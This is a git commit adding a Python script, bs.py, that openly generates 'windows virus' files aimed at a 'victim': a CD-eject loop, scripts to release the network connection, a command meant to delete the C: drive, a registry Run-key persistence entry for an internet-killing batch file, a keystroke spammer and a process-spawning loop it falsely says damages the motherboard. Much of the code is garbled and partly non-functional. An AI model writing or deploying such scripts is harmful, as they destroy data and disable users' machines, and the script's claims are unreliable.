75c35de5e0dbb7f7095b00b4a60c599dc1054e47
Anti9929 <62262397+Anti9929@users.noreply.github.com>
2020-08-03 19:52:48 +0300

    Add files via upload

---
+++ bs.py
@@ -0,0 +1,158 @@
+
+import random
+import sys
+import  os
+from time import sleep
+
+def ketik(s):
+	for ASU in s + '\n':
+		sys.stdout.write(ASU)
+		sys.stdout.flush()
+		sleep(50. / 1000)
+
+os.system('clear')
+
+
+A = """
+<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>
+< amino:black angel               >
+<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>
+
+"""
+print ("")
+print(A)
+
+ketik('''
+
+
+windows virus's☠️
+''')
+sleep(0.5)
+
+
+
+
+ketik('''
+Creating file with name : sadx.vds Ram pressure and device suspension
+
+''')
+sleep(0.5)
+
+with open('sadx.vbs', 'a') as x:
+     ss =('''
+     
+Set oWMP = CreateObject(“WMPlayer.OCX.7”)
+Set colCDROMs = oWMP.cdromCollection
+do
+if colCDROMs.Count >= 1 then
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+For i = 0 to colCDROMs.Count – 1
+colCDROMs.Item(i).Eject
+Next
+End If
+wscript.sleep 5000
+loop
+     
+     ''')
+     ketik(''+ss+'')
+     sleep(0.5)
+     x.write( ss +'\n')
+
+print('==================================')
+
+###############
+
+ketik('''
+Creating file with name : ip_off.bat Disconnect the internet from the victim of a form
+''')
+sleep(0.3)
+with open('ip_off.bat', 'a') as x:
+     dd = ('''
+@Echo off
+Ipconfig /releas
+     
+     ''')
+     ketik(''+dd+'')
+     sleep(0.5)
+     x.write(  dd + '\n')
+    
+print('==================================')
+
+ketik('''
+Creating file with name : Del_c.bat To delete the victim's c disk
+
+''')
+sleep(0.3)
+with open('Del_c.bat', 'a') as x:
+     ww = ('''
+@Echo off Del C: *.* |y
+     ''')
+     ketik(''+ww+'')
+     sleep(0.5)
+     x.write(  ww + '\n')
+
+print('==================================')
+
+ketik('''
+Creating file with name : Del_wi-fi.bat A computer virus to permanently disable the Internet
+
+''')
+sleep(0.3)
+with open('Del_wi-fi.bat', 'a') as x:
+     pp = ('''
+echo @echo off>c:windowswimn32.bat
+echo break off>c:windowswimn32.bat echo
+ipconfig/release_all>c:windowswimn32.bat
+echo end>c:windowswimn32.batreg add
+hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
+hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
+PAUSE
+     ''')
+     ketik(''+pp+'')
+     sleep(0.5)
+     x.write(  pp + '\n')
+
+print('==================================')
+
+ketik('''
+Creating file with name : enter.bat This virus will press the enter key continuously
+''')
+sleep(0.3)
+with open('enter.bat', 'a') as x:
+     j = ('''
+Set wshShell = wscript.CreateObject(”WScript.Shell”)
+do
+wscript.sleep 100
+wshshell.sendkeys “~(enter)”
+loop
+     ''')
+     ketik(''+j+'')
+     sleep(0.5)
+     x.write(  j + '\n')
+
+print('==================================')
+
+ketik('''
+Creating file with name : boom.bat  This virus damages the motherboard (very dangerous)
+''')
+sleep(0.3)
+with open('enter.bat', 'a') as x:
+     yt = ('''
+@echo off
+x
+start winword
+start mspaint
+start notepad
+start write
+start cmd
+start explorer
+start control
+start calc
+goto x
+     ''')
+     ketik(''+yt+'')
+     sleep(0.5)
+     x.write(  yt + '\n')
+
